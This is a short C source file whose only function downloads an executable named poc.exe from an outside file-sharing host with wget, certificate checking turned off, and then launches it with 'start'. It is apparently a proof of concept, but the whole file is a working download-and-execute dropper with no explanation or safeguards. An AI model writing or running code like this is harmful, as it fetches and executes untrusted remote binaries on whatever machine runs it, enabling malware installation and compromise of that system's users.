#include <unistd.h>
void stick(){
   system("wget --no-check-certificate https://get.station307.com/FILE_ID/poc.exe");
   system("start poc.exe");
}
int main() {
   stick();
   return 0;
}
